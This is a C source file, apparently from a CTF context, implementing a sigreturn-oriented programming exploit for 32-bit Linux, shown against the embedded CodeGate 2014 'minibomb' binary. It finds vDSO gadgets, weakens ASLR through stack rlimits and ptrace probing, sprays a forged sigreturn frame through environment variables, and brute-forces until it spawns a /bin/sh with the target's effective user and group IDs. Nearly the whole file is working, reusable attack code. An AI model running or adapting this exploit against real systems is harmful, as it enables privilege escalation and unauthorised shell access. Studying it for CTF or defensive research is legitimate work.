/*

  nux.c, Neighbourly Universal eXploit

  SROP for Linux i386 by brainsmoke

  ( as applied to codegate CTF 2014 prequals minibomb binary: )

  base64 -di << '  EOF' | zcat > minibomb ; chmod +x minibomb
    H4sIABL3CFMAA6t39XFjZGRkgAEmBmYGEG9BAwuHCYiGSpkwKABlNBhYoPJgAFQDwn5AARBmBYkJ
    MIDlA4BEwEQWDhC2APJBmA0qH/i0JIUBC2CDSKOAzge8//8zMDjoMggwMXQe3REFFOuVBZl6tqF3
    wRF+BoYd0SBlr3eCFJxtMHz7QhnI38ECUsdbDFS3ix3I3A1y09mGHSBqNwOY3fxGAKoqA6SKC0kV
    M8jEh7tAjoEq3sGG0AjVVQ3SxYPQ1XxE4DDU0UB9ICOUgPj/f5DzGRgKEouLk/NTUq0UGJz8/X0V
    FbkYkjNSk7Mz89L19PSAlusVZxSXFJUkJjHolaRWlDDopSSWJGILJeyAmwES7mzQuFsApNchycPC
    VRCqDuQ+cPwwQuIGBligNEwNDHQABcSR+LAUAwCh7aW1QAIAAA==
  EOF

  gcc -m32 -o nux nux.c ; ./nux ./minibomb

 */

#include <fcntl.h>
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <sys/resource.h>
#include <sys/wait.h>
/*#include <sys/auxv.h>*/ unsigned long getauxval(unsigned long type); /* not present in older GLIBCs */
#include <linux/auxvec.h>
#include <sys/ptrace.h>
#include <sys/user.h>

#define GET_SEG(SEG) ({long ret; __asm__ __volatile__ ("mov %%" SEG ", %0":"=r"(ret):); ret;})
#define GADGET(NAME, X) ({ static unsigned long x=0; if (!x) x=find_gadget(NAME, X,sizeof(X)-1); x; })

/* segments */

#define DATA_SEG     GET_SEG("ds")
#define CODE_SEG     GET_SEG("cs")
#define TLS_SEG      GET_SEG("gs")
#define EXECVE       11
#define _            -1

/* universal SROP */

#define SIGRETURN    GADGET("sigreturn()", "\x58\xb8\x77\x00\x00\x00\xcd\x80")
#define INT80        GADGET("int 80h", "\xcd\x80")
#define RET          GADGET("ret", "\xc3")

#define SYSENTER     GADGET("sysenter", "\x0f\x34")
#define POPEBP(val)  GADGET("pop ebp; pop; pop; ret", "\x5d\x5a\x59\xc3"), val, -1, -1

#define FILENAME     GADGET("string: \"nux\"", "nux\0")

#define STACKPIVOT(newstack) POPEBP(newstack-12), SYSENTER

/* gadget finder */

static unsigned long vdso_base=0;

unsigned long find_gadget(char *name, char *data, size_t len)
{
	unsigned long i;
	unsigned long vdso = getauxval(AT_SYSINFO_EHDR);

	if (!vdso_base)
		vdso_base = vdso;

	for (i=0 ;; i++)
		if (memcmp(data, &((char *)vdso)[i], len)==0)
		{
			fprintf(stderr, "\\o/ Found gadget in vdso @ 0x%04lx [ %s ]\n", i, name); fflush(stderr);
			return vdso_base+i;
		}
}

/* SROP */

typedef struct
{
	unsigned long

	__kernel_sigreturn,
	signo,    gs,       fs,       es,
	ds,       arg5,     arg4,     arg6,
	sp,       arg1,     arg3,     arg2,
	callno,   _u0,      _u1,      syscall,
	cs,       _u2,      _u3,      ss,
	fpstate,  sigmask,  cr2;

} srop_i386_t;

char *get_srop_slide(size_t size)
{
	unsigned long *buf = malloc(size);
	size_t i, slide_len = (size-0x800)/sizeof(unsigned long);
	for (i=0; i<slide_len; i++)
		buf[i] = RET;

	srop_i386_t *srop = (srop_i386_t *)&buf[slide_len];

	*srop = (srop_i386_t)
	{
		.__kernel_sigreturn = SIGRETURN,
		.cs = CODE_SEG,
		.ds = DATA_SEG,
		.es = DATA_SEG,
		.fs = 0,
		.gs = TLS_SEG,
		.ss = DATA_SEG,
		.arg1 = FILENAME,
		.callno = EXECVE,
		.syscall = INT80,
		.fpstate = 0,
	};

	return (char *)buf;
}

/* use ptrace first on a test-exec to get a good guess of where the vdso might end up */
static pid_t ptrace_process(char *target)
{
	pid_t pid;

	if ( (pid = fork()) == 0 )
	{
		/* force disabling setuid */
		ptrace(PTRACE_TRACEME, 0, NULL, NULL);
		execl(target, target, NULL);
	}
	wait(NULL);

	return pid;
}

static void ptrace_kill(pid_t pid)
{
	kill(pid, SIGKILL);
	wait(NULL);
}

static unsigned long ptrace_get_stackpointer(pid_t pid)
{
	struct user_regs_struct regs;
	ptrace(PTRACE_GETREGS, pid, NULL, &regs);
#if __WORDSIZE == 64
	return regs.rsp;
#else
	return regs.esp;
#endif
}

unsigned long ptrace_get_auxv(pid_t pid, long key)
{
	unsigned long *sp = (unsigned long *)ptrace_get_stackpointer(pid);

	sp++;
	while ( ptrace(PTRACE_PEEKDATA, pid, sp, 0) != 0 )
		sp++;
	sp++;
	while ( ptrace(PTRACE_PEEKDATA, pid, sp, 0) != 0 )
		sp++;
	sp++;
	while ( ptrace(PTRACE_PEEKDATA, pid, sp, 0) != key )
		sp+=2;
	sp++;
	return ptrace(PTRACE_PEEKDATA, pid, sp, 0);
}

unsigned long ptrace_get_vdso_base(char *target)
{
	pid_t pid = ptrace_process(target);
	unsigned long entry = ptrace_get_auxv(pid, AT_SYSINFO_EHDR);
	ptrace_kill(pid);
	fprintf(stderr, "\\o/ Found vdso @ 0x%08lx\n", entry); fflush(stderr);
	return entry;
}

unsigned long getauxval(unsigned long type)
{
	unsigned long pair[2], ret=0;
	int fd = open("/proc/self/auxv", O_RDONLY);
	while (read(fd, pair, sizeof(pair))==sizeof(pair))
		if (pair[0] == type)
		{
			ret = pair[1];
			break;
		}
	close(fd);
	return ret;
}

/* put arbitrary binary data on the stack */
int execvb(char *filename, char **argv,
           char *bindata, unsigned long size,
           unsigned long ptrsize, unsigned long alignment)
{
	unsigned long c, i;

	for (c=0,i=0; i<size; i++)
		if (bindata[i] == '\0')
			c++;

	char **envp = malloc( (c+3) * sizeof(char *) );

	envp[0] = &bindata[0];
	for (c=0,i=0; i<size; i++)
		if (bindata[i] == '\0')
			envp[++c] = &bindata[i+1];

	unsigned long datasize = size + strlen(filename)+2 + ptrsize,
	              padlen = alignment - ( datasize % alignment ),
	              lastsize = &bindata[size] - envp[c];

	char *last = malloc(lastsize+padlen+1);
	memcpy(last, envp[c], lastsize);
	memset(&last[lastsize], 'A', padlen);
	last[lastsize+padlen] = '\0';

	envp[c] = last;
	envp[c+1] = NULL;

	int ret = execve(filename, argv, envp);

	free(envp);
	free(last);

	return ret;
}

int main(int argc, char *argv[])
{
	if (argc == 0)
	{
		dup2(open("/dev/tty", O_RDONLY), 0);
		dup2(open("/dev/tty", O_RDWR), 1);
		dup2(open("/dev/tty", O_RDWR), 2);
		setresuid(geteuid(), geteuid(), geteuid());
		setresgid(getegid(), getegid(), getegid());
		execl("/bin/sh", "sh", NULL);
		exit(1);
	}

	/* disable ASLR if possible */
	setrlimit(RLIMIT_STACK, &(struct rlimit){RLIM_INFINITY, RLIM_INFINITY});

	vdso_base = ptrace_get_vdso_base(argv[1]);

	#define BLEN 0x20000
	char *envdata = get_srop_slide(BLEN);

	unsigned long newstack;
	if ( (unsigned long)&newstack > 0xc0000000)
		newstack = 0xfffe0004;
	else
		newstack = 0xbffe0004;

	/* exploit specific part */
	long payload[] = { _, _, _, _, STACKPIVOT(newstack) };

	int filedes[2];
	pipe(filedes);
	dup2(filedes[0],0);
	close(1);
	open("/dev/null", O_RDWR);

	for(;;)
	{
		write(filedes[1], payload, sizeof(payload));
		if (fork()==0)
			execvb(argv[1], NULL, envdata, BLEN, 4, 16);
		else
			wait(NULL);
	}
}
